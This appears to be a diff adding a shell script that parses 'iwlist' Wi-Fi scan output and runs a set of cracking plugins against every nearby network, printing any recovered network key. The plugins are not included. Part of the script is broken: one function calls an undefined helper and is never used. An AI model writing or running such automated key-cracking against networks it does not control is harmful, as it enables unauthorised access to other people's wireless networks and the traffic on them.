@@ -1,0 +1,75 @@
+#!/bin/sh
+# Usage; sudo iwlist wlan0 scan | ./inspector_wifi
+#
+#
+set -eu
+
+cd "$(dirname "$(readlink -f "$0")")"
+echo "waiting for iwlist scan data..." >&2
+
+crack_wifi(){
+  for i in ../lib/autowifi/plugins/*;do
+    if RET=$(./$i "$@" 2>/dev/null);then
+      echo "$@ - with crack $i succeeded - Key is $RET"
+    fi
+  done
+}
+
+shell_escape(){
+  sed 's/./\\&/g'
+}
+remove_quotes(){
+  sed 's/^"\|"$//g'
+}
+
+
+iwlist_scan_parser(){
+    count=0
+    while read line;
+    do
+        case "$line" in
+
+            *"Cell "*)
+                if [ $count -ne  0 ];then
+                  crack_wifi "$ESSID" $MAC $CHANNEL any_encryption
+                fi
+                WPA=0
+                WPA2=0
+                : $((count+=1))
+                MAC=${line#*Address: }
+                ;;
+            *Channel:*)
+                CHANNEL=${line#*:}
+                ;;
+            *Quality=*)
+                QUALITY="`printf '%s' ${line#*Quality=} | cut -d/  -f 1`"
+                ;;
+            *"Encryption key:"*)
+                ENCRYPTION=${line#*key:}
+                ;;
+            *ESSID:*)
+              ESSID=$(echo "${line#*ESSID:}" | remove_quotes)
+                ;;
+            *"IE: IEEE 802.11i/WPA2"*)
+                WPA2=1
+                ;;
+            *"IE: WPA Version 1"*)
+                WPA=1
+                ;;
+            *);; #important, do not delete!
+        esac
+    done;
+    crack_wifi "$ESSID" $MAC $CHANNEL any_encryption
+    echo WIFI_COUNT=$count
+}
+
+wifi_init(){
+  iwlist_scan_parser
+}
+
+loop_networks(){
+    for i in `seq 1 $WIFI_COUNT`; do
+        loop_over_cracks "$i"
+    done
+}
+wifi_init
